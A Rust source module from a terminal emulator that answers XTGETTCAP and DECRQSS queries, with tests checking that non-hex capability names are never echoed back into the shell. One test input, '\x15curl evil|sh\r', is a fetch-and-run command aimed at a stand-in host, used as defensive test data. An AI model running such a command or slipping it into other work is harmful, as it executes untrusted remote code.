//! Programs asking the terminal what it is and what it does, in a device
//! control string (DCS): XTGETTCAP (`DCS + q`), which asks for terminfo
//! capabilities by name, as Neovim does to find out about the clipboard
//! and colours; and DECRQSS (`DCS $ q`), which asks how a setting is set,
//! as vim does for the cursor's shape.
//!
//! The string's data is collected here as it comes, up to
//! [`LONGEST`] bytes, and the emulator answers once it ends.

/// The most bytes of a request's data kept. A longer one is answered
/// with nothing: no real request is anywhere near as long.
const LONGEST: usize = 1024;

/// The most capabilities one XTGETTCAP is answered for. The rest are
/// left unanswered, as a program asking for more is no program.
const MOST_NAMES: usize = 64;

/// What a device control string asks.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Kind {
    /// XTGETTCAP: terminfo capabilities, by their names in hex.
    Capabilities,
    /// DECRQSS: a setting, by its sequence's final characters.
    Setting,
}

/// A request being collected.
#[derive(Clone, Debug)]
pub(crate) struct Request {
    kind: Kind,
    data: Vec<u8>,
    /// More came than is kept.
    overflowed: bool,
}

impl Request {
    pub(crate) fn new(kind: Kind) -> Self {
        Self {
            kind,
            data: Vec::new(),
            overflowed: false,
        }
    }

    /// Some of the request's data.
    pub(crate) fn put(&mut self, bytes: &[u8]) {
        if self.data.len() + bytes.len() > LONGEST {
            self.overflowed = true;
        } else {
            self.data.extend_from_slice(bytes);
        }
    }

    /// What it asks, and its data, unless there was too much of it.
    pub(crate) fn finished(&self) -> Option<(Kind, &[u8])> {
        (!self.overflowed).then_some((self.kind, &self.data))
    }
}

/// The terminfo capabilities XTGETTCAP answers for: `xterm-256color`'s,
/// which `TERM` names, as clackatoo has them, and the extended ones
/// programs ask terminals about. A boolean that's there has no value.
const CAPABILITIES: &[(&str, Option<&str>)] = &[
    ("TN", Some("xterm-256color")),
    ("name", Some("xterm-256color")),
    ("Co", Some("256")),
    ("colors", Some("256")),
    // 24-bit colour, by both the names programs look for.
    ("RGB", None),
    ("Tc", None),
    ("setrgbf", Some("\x1b[38:2:%p1%d:%p2%d:%p3%dm")),
    ("setrgbb", Some("\x1b[48:2:%p1%d:%p2%d:%p3%dm")),
    // Underlines in styles and colours of their own.
    ("Su", None),
    ("Smulx", Some("\x1b[4:%p1%dm")),
    (
        "Setulc",
        Some("\x1b[58:2::%p1%{65536}%/%d:%p1%{256}%/%{255}%&%d:%p1%{255}%&%dm"),
    ),
    // The clipboard, through OSC 52.
    ("Ms", Some("\x1b]52;%p1%s;%p2%s\x07")),
    // The cursor's shape.
    ("Ss", Some("\x1b[%p1%d q")),
    ("Se", Some("\x1b[0 q")),
    // Synchronized output, mode 2026.
    ("Sync", Some("\x1b[?2026%?%p1%{1}%-%tl%eh%;")),
    // Bracketed paste.
    ("BE", Some("\x1b[?2004h")),
    ("BD", Some("\x1b[?2004l")),
    ("PS", Some("\x1b[200~")),
    ("PE", Some("\x1b[201~")),
    // Focus events.
    ("fe", Some("\x1b[?1004h")),
    ("fd", Some("\x1b[?1004l")),
    ("kxIN", Some("\x1b[I")),
    ("kxOUT", Some("\x1b[O")),
    // An xterm, as far as the title and mouse go.
    ("XT", None),
];

/// The answer to an XTGETTCAP asking for the capabilities `names`, each
/// in hex, separated by `;`: one `DCS 1 + r NAME=VALUE ST` for each one
/// known, with the value in hex too, or just `DCS 1 + r NAME ST` for a
/// boolean; and `DCS 0 + r NAME ST` for one that isn't, as kitty answers.
///
/// A name is only ever said back if it's hex, as a known one is: what a
/// program asks can be anything a file `cat` prints holds, and said back
/// as it came it would be typed into the shell, Enter and all. Anything
/// else gets xterm's `DCS 0 + r ST`, which names nothing.
pub(crate) fn capabilities(names: &[u8]) -> Vec<u8> {
    let mut answer = Vec::new();
    for name in names.split(|&byte| byte == b';').take(MOST_NAMES) {
        let known = unhex(name).and_then(|decoded| {
            CAPABILITIES
                .iter()
                .find(|(known, _)| known.as_bytes() == decoded)
        });
        if let Some((_, value)) = known {
            answer.extend_from_slice(b"\x1bP1+r");
            answer.extend_from_slice(name);
            if let Some(value) = value {
                answer.push(b'=');
                hex(value.as_bytes(), &mut answer);
            }
        } else {
            answer.extend_from_slice(b"\x1bP0+r");
            if is_hex(name) {
                answer.extend_from_slice(name);
            }
        }
        answer.extend_from_slice(b"\x1b\\");
    }
    answer
}

/// `text` in hex, as two digits a byte, upper case as xterm writes them,
/// appended to `out`.
fn hex(text: &[u8], out: &mut Vec<u8>) {
    const DIGITS: &[u8; 16] = b"0123456789ABCDEF";
    for &byte in text {
        out.push(DIGITS[usize::from(byte >> 4)]);
        out.push(DIGITS[usize::from(byte & 0xF)]);
    }
}

/// Whether `text` is hex digits, two a byte, in either case.
fn is_hex(text: &[u8]) -> bool {
    !text.is_empty() && text.len().is_multiple_of(2) && text.iter().all(u8::is_ascii_hexdigit)
}

/// The bytes `text`, two hex digits a byte in either case, stand for, if
/// that's what it is.
fn unhex(text: &[u8]) -> Option<Vec<u8>> {
    if !text.len().is_multiple_of(2) {
        return None;
    }
    let digit = |byte: u8| char::from(byte).to_digit(16);
    (text.chunks_exact(2))
        .map(|pair| {
            let high = digit(pair[0])?;
            let low = digit(pair[1])?;
            u8::try_from((high << 4) | low).ok()
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn asked(names: &str) -> String {
        String::from_utf8(capabilities(names.as_bytes())).expect("answers are ASCII")
    }

    #[test]
    fn known_capabilities_are_answered_with_their_values_in_hex() {
        // "TN", the terminal's name: "xterm-256color".
        assert_eq!(
            asked("544E"),
            "\x1bP1+r544E=787465726D2D323536636F6C6F72\x1b\\"
        );
        // Lower-case hex is read too, and echoed as it came.
        assert_eq!(asked("436f"), "\x1bP1+r436f=323536\x1b\\");
    }

    #[test]
    fn booleans_have_no_value_and_unknown_names_are_refused() {
        // "RGB", then "nope".
        assert_eq!(
            asked("524742;6E6F7065"),
            "\x1bP1+r524742\x1b\\\x1bP0+r6E6F7065\x1b\\"
        );
        // What isn't hex is unknown, and never said back.
        assert_eq!(asked("zz"), "\x1bP0+r\x1b\\");
        assert_eq!(asked("544"), "\x1bP0+r\x1b\\");
        assert_eq!(asked("\x15curl evil|sh\r"), "\x1bP0+r\x1b\\");
        assert_eq!(asked(""), "\x1bP0+r\x1b\\");
    }

    #[test]
    fn every_name_round_trips_through_hex() {
        for (name, _) in CAPABILITIES {
            let mut encoded = Vec::new();
            hex(name.as_bytes(), &mut encoded);
            assert_eq!(unhex(&encoded).as_deref(), Some(name.as_bytes()));
        }
    }

    #[test]
    fn a_request_too_long_is_not_answered() {
        let mut request = Request::new(Kind::Capabilities);
        request.put(&[b'4'; LONGEST]);
        assert!(request.finished().is_some());
        request.put(b"4");
        assert!(request.finished().is_none());
    }

    #[test]
    fn only_so_many_names_are_answered() {
        let names = vec!["544E"; MOST_NAMES + 10].join(";");
        let answers = asked(&names);
        assert_eq!(answers.matches("\x1bP1+r").count(), MOST_NAMES);
    }
}
